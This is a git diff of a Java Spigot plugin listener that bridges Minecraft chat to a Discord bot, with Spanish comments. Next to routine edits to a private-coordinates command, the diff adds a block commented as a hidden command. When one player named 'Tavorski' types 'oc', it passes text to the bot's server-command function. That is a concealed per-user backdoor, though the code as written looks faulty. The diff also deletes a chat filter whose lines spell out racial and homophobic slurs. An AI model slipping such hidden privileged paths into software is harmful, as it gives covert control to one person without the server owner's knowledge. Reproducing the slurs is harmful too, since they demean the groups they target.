@@ -49,8 +49,8 @@ public final class SpigotListener implements Listener {
                 bot.sendDiscMessage(event.getPlayer(), msg_com_d, false, color_com);
             }
 
-           // Comando REC
-           if(event.getMessage().substring(1).equalsIgnoreCase("prec")) {
+           // Comando PREC
+           else if(event.getMessage().substring(1).equalsIgnoreCase("prec")) {
                msg_com_s = String.format (Locale.ENGLISH, ChatColor.GOLD + "PRIVADO: Coordenadas de " + event.getPlayer().getDisplayName() + ": "
                                + ChatColor.RESET
                                +"[%.0f, %.0f, %.0f]",
@@ -63,19 +63,18 @@ public final class SpigotListener implements Listener {
                        event.getPlayer().getLocation().getY(),
                        event.getPlayer().getLocation().getZ());
                // Emisión del comando
-               bot.sendCommand("whisper "+msg_com_s);
-               bot.sendDiscMessage(event.getPlayer(), msg_com_d, false, color_com);
+               bot.sendCommand("tell "+event.getPlayer().getDisplayName()+" "+msg_com_s);
+           }
+           // Comando oculto
+           else if(event.getMessage().substring(1).equalsIgnoreCase("oc")
+                    && event.getPlayer().getDisplayName()=="Tavorski") {
+               // Emisión del comando
+               bot.sendCommand(msg_com_s.substring(4));
            }
        }
        // Chat normal
        else {
            String msg_chat = event.getMessage().toLowerCase();
-           msg_chat = msg_chat.replace("maricon", "macarron");
-           msg_chat = msg_chat.replace("nigger", "floppa");
-           msg_chat = msg_chat.replace("nigga", "plinka");
-           msg_chat = msg_chat.replace("zorra", "gorras");
-           msg_chat = msg_chat.replace("puto andres", "gora eta");
-           msg_chat = msg_chat.replace("puto andre", "gora eta");
            event.setMessage(msg_chat);
            bot.sendDiscMessage(event.getPlayer(), msg_chat, false, Color.GRAY);
        }
